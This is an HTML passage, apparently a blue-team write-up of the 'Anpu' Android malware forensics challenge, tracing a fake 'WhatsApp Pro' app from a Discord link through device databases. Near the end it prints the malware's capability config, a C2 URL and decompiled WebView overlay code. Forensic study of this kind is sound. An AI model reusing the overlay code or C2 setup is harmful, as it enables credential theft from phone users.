<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <title>Anpu - Hexicon Archives</title>
    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
    <link rel="stylesheet" href="../style.css">
    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/Anpu.html" />
    <!-- Sherlock-specific metadata for SEO -->
    <meta name="description" content="Writeup for Anpu sherlock - Medium difficulty level">
    <meta name="keywords" content="Sherlock, Anpu, Medium, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
</head>
<body>
    <header>
        <div class="container header-content">
            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
            <div class="header-controls">
                <a href="../index.html" class="htb-icon" title="Link to the main page">
                    <img src="../favicon.png" alt="Archive" width="30" height="30">
                </a>
                <div class="hamburger-menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </header>
    
    <div class="sidebar">
        <div class="difficulty-buttons">
            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
            <div class="sherlock-list" id="veasy-sherlocks">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
            <div class="sherlock-list" id="easy-sherlocks">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <div class="sherlock-list" id="medium-sherlocks">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
            <div class="sherlock-list" id="hard-sherlocks">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
            <div class="sherlock-list" id="insane-sherlocks">
                <!-- Will be populated dynamically -->
            </div>
        </div>
    </div>
    
    <div class="backdrop"></div>
    
    <main class="container writeup-content">
        <h1 class="writeup-title">Anpu</h1>
        <div class="writeup-metadata">
            <span class="difficulty medium">Medium</span>
            <span class="date">August 14, 2025</span>
        </div>
        
        <div class="writeup-container">
            <div class="writeup-body">
                <!-- Sherlock-specific content goes here -->
                <p><img alt="solved" src="../images/Anpu/solved.png" /></p>
<h1>Task 1</h1>
<p>The challenge archive contains a dump of the infected device's data. Looking at the app directory, I can see a suspiciously-named package.</p>
<p><img alt="app" src="../images/Anpu/app.png" /></p>
<p>I'll answer the question with <code>bdlxtspya.heihqyeizynsrdfg.tpqlhhugp</code></p>
<p><img alt="task1" src="../images/Anpu/task1.png" /></p>
<h1>Task 2</h1>
<p>For task 2, I will enumerate apps through which someone could've sent John the link. I'll start off with Discord.</p>
<p><img alt="database" src="../images/Anpu/database.png" /></p>
<p>The file <code>files/kv-storage/@account.1260009116026540205/a</code> under Discord contains a mention of the string. This is actually an sqlite database, so it should be easy to browse it.</p>
<p><img alt="discord" src="../images/Anpu/discord.png" /></p>
<p>Someone messaged John on Discord and sent a download link for WhatsApp Pro. Using file.io, the attacker sent John a link to the malicious app, which he clicked.</p>
<p>I will answer question 2 using <code>Discord</code></p>
<p><img alt="task2" src="../images/Anpu/task2.png" /></p>
<h1>Task 3</h1>
<p>This link can be seen in the database entry from task 2, but not only there.</p>
<p>A quick search led me to an article explaining what the <code>external.db</code> database is.</p>
<p><code>https://findingtrouble.medium.com/the-role-of-external-db-in-android-forensics-53087f048864</code></p>
<p>Essentially, it is a catalog of files present on the filesystem that are recognized by the Android MediaStore. Additionally, it also has a table for downloaded files, which provides a similar level of valuable detail about these files.</p>
<p>In this scenario, it is located under <code>data/com.android.providers.media/databases/external.db</code></p>
<p><img alt="downloads" src="../images/Anpu/downloads.png" /></p>
<p>Either way, the answer will be <code>https://file.io/bvWaQm6jr1Ut</code></p>
<p><img alt="task3" src="../images/Anpu/task3.png" /></p>
<h1>Task 4</h1>
<p>The file has been downloaded with Chrome, which has its own way of storing timestamps.</p>
<p>I took the answer from <code>https://stackoverflow.com/questions/20458406/what-is-the-format-of-chromes-timestamps</code>. Chrome's timestamps are formatted as the number of microseconds since January 1601</p>
<p><code>https://www.epochconverter.com/webkit</code></p>
<p>Using this converter, I can convert these timestamps to a readable format.</p>
<p>Now I need to find some. A bit of research brought me to a different sqlite database located at <code>data/com.android.chrome/app_chrome/Default/History</code></p>
<p><img alt="history" src="../images/Anpu/history.png" /></p>
<p>Which holds a timestamp in the mentioned format. <code>13365137543178874</code></p>
<p>Converting it with the epochconverter website returns a GMT timestamp.</p>
<p><img alt="convert" src="../images/Anpu/convert.png" /></p>
<p>And after converting the GMT timestamp to UTC, I am left with <code>2024-07-11 02:12:26</code>, which will be my answer to question 4.</p>
<p><img alt="task4" src="../images/Anpu/task4.png" /></p>
<h1>Task 5</h1>
<p>I will investigate the <code>packages.xml</code> file, which contains information about every package installed on the device.</p>
<p><code>cat system/packages.xml | grep 'bdlxtspya.heihqyeizynsrdfg.tpqlhhugp'</code></p>
<p><img alt="packages" src="../images/Anpu/packages.png" /></p>
<p>The 3 timestamps are what I'm after. They are in hex, but it should be simple to convert.</p>
<div class="codehilite"><pre><span></span><code>ft=&quot;1909fa201a8&quot; - First install time

it=&quot;1909fa2050b&quot; - Install time

ut=&quot;1909fa2050b&quot; - LastUpdate time
</code></pre></div>

<p>I will take the first install time, and I'll convert it from hex to decimal.</p>
<p><code>https://www.rapidtables.com/convert/number/hex-to-decimal.html</code></p>
<p><img alt="converthex" src="../images/Anpu/converthex.png" /></p>
<p>I'll take the new timestamp and I'll use epochconvert to get a readable format.</p>
<p><img alt="epochconvert" src="../images/Anpu/epochconvert.png" /></p>
<p>My answer to task 5 will be <code>2024-07-11 02:31:53</code></p>
<p><img alt="task5" src="../images/Anpu/task5.png" /></p>
<h1>Task 6</h1>
<p>Runtime permissions of apps can be seen in <code>/system/users/0/runtime-permissions.xml</code></p>
<p><code>cat system/users/0/runtime-permissions.xml | grep 'bdlxtspya.heihqyeizynsrdfg.tpqlhhugp' -A 10 -B 2</code></p>
<p><img alt="perms" src="../images/Anpu/perms.png" /></p>
<p>Now I need to count up all the entries where granted equals true. In total, there are 6 of them, and that number will be my answer to task 6.</p>
<p><img alt="task6" src="../images/Anpu/task6.png" /></p>
<h1>Task 7</h1>
<p>In the same directory, there is an <code>app_idle_stats.xml</code> file. I'll grep it for the malicious app.</p>
<p><code>cat system/users/0/app_idle_stats.xml | grep 'bdlxtspya.heihqyeizynsrdfg.tpqlhhugp'</code></p>
<p><img alt="idle" src="../images/Anpu/idle.png" /></p>
<p>The timestamp is displayed in milliseconds. After converting it to seconds, then to minutes, and then dropping the fraction, I'm left with 261 minutes. This will be my final answer.</p>
<p><img alt="task7" src="../images/Anpu/task7.png" /></p>
<h1>Task 8</h1>
<p>For this task, I will use ALEAPP (Android Logs Events And Protobuf Parser).</p>
<p><code>https://github.com/abrignoni/ALEAPP</code></p>
<p>After cloning the repo, I ran the GUI version and gave it the whole data.zip directory.</p>
<p><img alt="aleapp" src="../images/Anpu/aleapp.png" /></p>
<p>Then, I used a recursive grep with the package's name in the output dir to see everything tied to it.</p>
<p>Inside <code>ALEAPP_Reports_2025-08-14_Thursday_030313/_TSV Exports/usagestats.tsv</code>, there were a lot of timestamped events caused by the app. The last one at <code>2024-07-11 21:35:13</code> was a notification being interrupted, probably part of the malware's spam capability.</p>
<p><code>ALEAPP_Reports_2025-08-14_Thursday_030313/_TSV Exports/usagestats.tsv: | 2024-07-11 21:35:13 | event-log | 0 | bdlxtspya.heihqyeizynsrdfg.tpqlhhugp | NOTIFICATION_INTERRUPTION | daily</code></p>
<p>This timestamp will be my answer to question 8.</p>
<p><img alt="task8" src="../images/Anpu/task8.png" /></p>
<h1>Task 9</h1>
<p>The notifications are stored in an sqlite database under <code>system/notification_log.db</code></p>
<p>To get notifications coming from the app only, I will use this query <code>select * from log where pkg = 'bdlxtspya.heihqyeizynsrdfg.tpqlhhugp';</code></p>
<p><img alt="notif" src="../images/Anpu/notif.png" /></p>
<p>I'll refine the query to trim down the amount of notifications. This time, I'll grab only the unmuted notifications, while sorting the results by the <code>event time ms</code> column.</p>
<p><code>select * from log where pkg = 'bdlxtspya.heihqyeizynsrdfg.tpqlhhugp' and muted = 0 order by event_time_ms desc;</code></p>
<p><img alt="notif2" src="../images/Anpu/notif2.png" /></p>
<p>The target timestamp is <code>1720666603904</code>, but it needs a bit of conversion.</p>
<p>I converted the miliseconds to seconds, and used date to get a readable result.</p>
<p><code>date -u -d @1720666603</code></p>
<p><img alt="date" src="../images/Anpu/date.png" /></p>
<p>My answer to question 9 will be <code>2024-07-11 02:56:43</code></p>
<p><img alt="task9" src="../images/Anpu/task9.png" /></p>
<h1>Task 10</h1>
<p>I uploaded the .apk file to VirusTotal and checked the behavior tab.</p>
<p><img alt="fsactions" src="../images/Anpu/fsactions.png" /></p>
<p>The malware creates an .xml file.</p>
<p><code>/data/data/bdlxtspya.heihqyeizynsrdfg.tpqlhhugp/shared_prefs/set.xml</code></p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;</span>
<span class="nt">&lt;map&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;madeSettings&quot;</span><span class="nt">&gt;</span>1<span class="w"> </span>2<span class="w"> </span>3<span class="w"> </span>4<span class="w"> </span>5<span class="w"> </span>6<span class="w"> </span>7<span class="w"> </span>8<span class="w"> </span>9<span class="w"> </span>10<span class="w"> </span>11<span class="w"> </span>12<span class="w"> </span>13<span class="w"> </span>14<span class="w"> </span>15<span class="w"> </span><span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;StringPermis&quot;</span><span class="nt">&gt;</span>Allow<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;uninstall1&quot;</span><span class="nt">&gt;</span>uninstall<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;run_app&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;startRequest&quot;</span><span class="nt">&gt;</span>Access=0Perm=0<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;sound&quot;</span><span class="nt">&gt;</span>start<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;isContinueProgramMiUi&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;screen&quot;</span><span class="nt">&gt;</span>on<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;vkladmin&quot;</span><span class="nt">&gt;</span>include<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;DexSocksMolude&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;apps2delete&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;uninstall_bot&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;websocket&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;block_notifications&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;uninstall2&quot;</span><span class="nt">&gt;</span>to<span class="w"> </span>remove<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;lookscreen&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;StringAccessibility&quot;</span><span class="nt">&gt;</span>Enable<span class="w"> </span>access<span class="w"> </span>for<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;dateCJ&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;id_windows_bot&quot;</span><span class="nt">&gt;&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;googleProtectStatus&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;StringActivate&quot;</span><span class="nt">&gt;</span>activate<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;checkStartGrabber&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;vnc&quot;</span><span class="nt">&gt;</span>start<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;cryptfile&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
<span class="w">    </span><span class="nt">&lt;string</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;recordsoundseconds&quot;</span><span class="nt">&gt;</span>0<span class="nt">&lt;/string&gt;</span>
<span class="nt">&lt;SNIP&gt;</span>
</code></pre></div>

<p>It contains a list of the malware's capabilities and serves as its configuration file. <code>set.xml</code> will be my answer to question 10.</p>
<p><img alt="task10" src="../images/Anpu/task10.png" /></p>
<h1>Task 11</h1>
<p>I can see the unrInj string in the config file. However, it does not decode into anything from base64.</p>
<p>To analyze the app's source code, I will be using jadx-gui. The app is located under <code>media/0/downloads/</code></p>
<p><img alt="results" src="../images/Anpu/results.png" /></p>
<p>I searched for the string <code>urlInj</code> in the decompiled output, and there were 6 results. I clicked the first one.</p>
<p><img alt="result" src="../images/Anpu/result.png" /></p>
<p>It replaces the contents of <code>urlInj</code> in the config file with <code>https://pepitok.club/dope</code>. This is most definitely a part of its C2 communication scheme.</p>
<p><img alt="task11" src="../images/Anpu/task11.png" /></p>
<h1>Task 12</h1>
<p>From the config file, I know that the app uses WebView to manipulate the user's browser and display malicious overlays. I searched for WebView in jadx-gui.</p>
<p><img alt="webview" src="../images/Anpu/webview.png" /></p>
<p>There were 93 results, but not nearly as many subpackages. I began checking them one by one and found one that matched what I was looking for.</p>
<div class="codehilite"><pre><span></span><code><span class="n">package</span><span class="w"> </span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">cgbnnsgvqscjd</span><span class="p">;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">android.annotation.SuppressLint</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">android.app.Activity</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Bundle</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.WebView</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.WebViewClient</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.R</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">bdlxtspya.heihqyeizynsrdfg.tpqlhhugp.dgbccvtqpsqlrxbzujg.datdqvcqmfmog.gfmecgohlgj.GHqqn0pC2O2VWOBi</span><span class="p">;</span>

<span class="o">/*</span><span class="w"> </span><span class="n">loaded</span><span class="w"> </span><span class="n">from</span><span class="p">:</span><span class="w"> </span><span class="n">classes</span><span class="o">.</span><span class="n">dex</span><span class="w"> </span><span class="o">*/</span>
<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">uaBtYrqgwpi</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="n">Activity</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="o">/*</span><span class="w"> </span><span class="n">renamed</span><span class="w"> </span><span class="n">from</span><span class="p">:</span><span class="w"> </span><span class="n">GHqqn0pC2O2VWOBi</span><span class="p">,</span><span class="w"> </span><span class="n">reason</span><span class="p">:</span><span class="w"> </span><span class="n">collision</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">package</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">*/</span>
<span class="w">    </span><span class="n">WebView</span><span class="w"> </span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="p">;</span>

<span class="w">    </span><span class="o">/*</span><span class="w"> </span><span class="n">renamed</span><span class="w"> </span><span class="n">from</span><span class="p">:</span><span class="w"> </span><span class="n">G9IIDoU5BG6kP9ak</span><span class="p">,</span><span class="w"> </span><span class="n">reason</span><span class="p">:</span><span class="w"> </span><span class="n">collision</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">package</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">*/</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">f918G9IIDoU5BG6kP9ak</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/dope/firstLocal.html&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">crt0auXnG4Wbo6f1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/dope/secondLocal.html&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">private</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">pFJmwy7NkOSa9YjF</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;/dope/thirdLocal.html&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="n">boolean</span><span class="w"> </span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">false</span><span class="p">;</span>

<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="nc">p0prUw0vSWgOVKCc</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="n">WebViewClient</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">p0prUw0vSWgOVKCc</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nd">@Override</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">android</span><span class="o">.</span><span class="n">webkit</span><span class="o">.</span><span class="n">WebViewClient</span>
<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">onPageFinished</span><span class="p">(</span><span class="n">WebView</span><span class="w"> </span><span class="n">webView</span><span class="p">,</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="nb">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nb">String</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uaBtYrqgwpi</span><span class="o">.</span><span class="n">this</span><span class="o">.</span><span class="n">getString</span><span class="p">(</span><span class="n">R</span><span class="o">.</span><span class="n">string</span><span class="o">.</span><span class="n">protect_name</span><span class="p">);</span>
<span class="w">            </span><span class="n">uaBtYrqgwpi</span><span class="o">.</span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">loadUrl</span><span class="p">(</span><span class="s2">&quot;javascript:changeAccessibilityName(&#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&#39;)&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">android</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">Activity</span>
<span class="w">    </span><span class="nd">@SuppressLint</span><span class="p">({</span><span class="s2">&quot;SetJavaScriptEnabled&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;AddJavascriptInterface&quot;</span><span class="p">})</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">bundle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">WebView</span><span class="w"> </span><span class="n">webView</span><span class="p">;</span>
<span class="w">        </span><span class="nb">String</span><span class="w"> </span><span class="nb">str</span><span class="p">;</span>
<span class="w">        </span><span class="nb">super</span><span class="o">.</span><span class="n">onCreate</span><span class="p">(</span><span class="n">bundle</span><span class="p">);</span>
<span class="w">        </span><span class="n">WebView</span><span class="w"> </span><span class="n">webView2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">WebView</span><span class="p">(</span><span class="n">this</span><span class="p">);</span>
<span class="w">        </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">webView2</span><span class="p">;</span>
<span class="w">        </span><span class="n">webView2</span><span class="o">.</span><span class="n">getSettings</span><span class="p">()</span><span class="o">.</span><span class="n">setJavaScriptEnabled</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">r</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">aiysnpvtilhhbx</span><span class="o">.</span><span class="n">pwptgwsqipzoqf</span><span class="o">.</span><span class="n">edyjapgaahaxjghzy</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">f911p0prUw0vSWgOVKCc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">true</span><span class="p">;</span>
<span class="w">            </span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">pwwtwzfaatldkksv</span><span class="o">.</span><span class="n">xwtipxwqegmu</span><span class="o">.</span><span class="n">tbaxifmckacbaviei</span><span class="o">.</span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="s2">&quot;V11&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="s2">&quot;V12&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">loadUrl</span><span class="p">(</span><span class="n">crt0auXnG4Wbo6f1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="o">.</span><span class="n">q</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">webView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="p">;</span>
<span class="w">            </span><span class="nb">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pFJmwy7NkOSa9YjF</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">webView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="p">;</span>
<span class="w">            </span><span class="nb">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f918G9IIDoU5BG6kP9ak</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">webView</span><span class="o">.</span><span class="n">loadUrl</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
<span class="w">        </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">addJavascriptInterface</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">bdlxtspya</span><span class="o">.</span><span class="n">heihqyeizynsrdfg</span><span class="o">.</span><span class="n">tpqlhhugp</span><span class="o">.</span><span class="n">cgbnnsgvqscjd</span><span class="o">.</span><span class="n">uqhiodptjooiglc</span><span class="o">.</span><span class="n">gussusfjlgqjiiit</span><span class="o">.</span><span class="n">p0prUw0vSWgOVKCc</span><span class="p">(</span><span class="n">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Android&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="o">.</span><span class="n">setWebViewClient</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">p0prUw0vSWgOVKCc</span><span class="p">());</span>
<span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">f919GHqqn0pC2O2VWOBi</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">android</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">Activity</span>
<span class="w">    </span><span class="n">protected</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">onPause</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">super</span><span class="o">.</span><span class="n">onPause</span><span class="p">();</span>
<span class="w">        </span><span class="n">DteN3ovpuVMACQRy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">false</span><span class="p">;</span>
